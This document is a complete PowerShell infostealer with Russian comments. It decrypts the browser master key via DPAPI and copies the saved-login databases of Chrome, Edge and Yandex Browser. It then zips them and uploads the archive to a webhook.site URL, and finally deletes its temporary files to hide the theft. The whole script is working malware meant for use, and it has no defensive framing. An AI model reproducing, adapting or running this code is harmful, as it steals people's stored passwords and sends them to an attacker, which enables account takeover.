# [ Конфигурация ]
$webhookUrl = "https://webhook.site/94f7a3be-c2d7-4eaa-872b-7a1e5897bf12"
$tempDir = "$env:TEMP\sys_info_$(Get-Random)"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
$logPath = "$tempDir\report.log"

# КРИТИЧНО: Подгружаем сборку для дешифровки через DPAPI
Add-Type -AssemblyName System.Security

# Функция для логирования и дешифровки ключа
function Get-Key($statePath, $label) {
    if (Test-Path $statePath) {
        try {
            $json = Get-Content $statePath -Raw | ConvertFrom-Json
            $encKey = [Convert]::FromBase64String($json.os_crypt.encrypted_key)[5..$([Convert]::FromBase64String($json.os_crypt.encrypted_key).Length-1)]
            
            # Дешифровка мастер-ключа
            $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
            
            $logLine = "[$label] Master Key: $([Convert]::ToBase64String($masterKey))"
            Out-File -FilePath $logPath -InputObject $logLine -Append -Encoding UTF8
            return $true
        } catch { 
            $errLine = "[$label] Key Error: $($_.Exception.Message)"
            Out-File -FilePath $logPath -InputObject $errLine -Append -Encoding UTF8
            return $false 
        }
    }
    return $false
}

# Список целей: Chrome, Edge, Yandex
$browsers = @(
    @{name="Chrome"; path="Google\Chrome\User Data"},
    @{name="Edge"; path="Microsoft\Edge\User Data"},
    @{name="Yandex"; path="Yandex\YandexBrowser\User Data"}
)

foreach ($b in $browsers) {
    $userDataPath = Join-Path $env:LOCALAPPDATA $b.path
    if (Test-Path $userDataPath) {
        # Рекурсивный поиск всех файлов 'Login Data'
        $foundFiles = Get-ChildItem -Path $userDataPath -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue
        foreach ($file in $foundFiles) {
            $profileName = $file.Directory.Name
            $localState = Join-Path $userDataPath "Local State"
            
            $label = "$($b.name)_$profileName"
            if (Get-Key $localState $label) {
                # Копируем базу, если ключ успешно получен
                Copy-Item $file.FullName -Destination "$tempDir\$label`_db" -Force -ErrorAction SilentlyContinue
            }
        }
    }
}

# Если данные собраны — упаковываем и отправляем через .NET WebClient
if ((Get-ChildItem $tempDir).Count -gt 1) {
    $zipPath = "$env:TEMP\data_$(Get-Random).zip"
    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
    
    try {
        $wc = New-Object System.Net.WebClient
        # Твой проверенный способ отправки
        $wc.UploadFile($webhookUrl, "POST", $zipPath) | Out-Null
    } catch {
        # В случае ошибки отправки архива, можно залогировать это локально (опционально)
    }
    
    if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
}

# Финальная очистка временной папки
Remove-Item -Recurse -Force $tempDir -ErrorAction SilentlyContinue
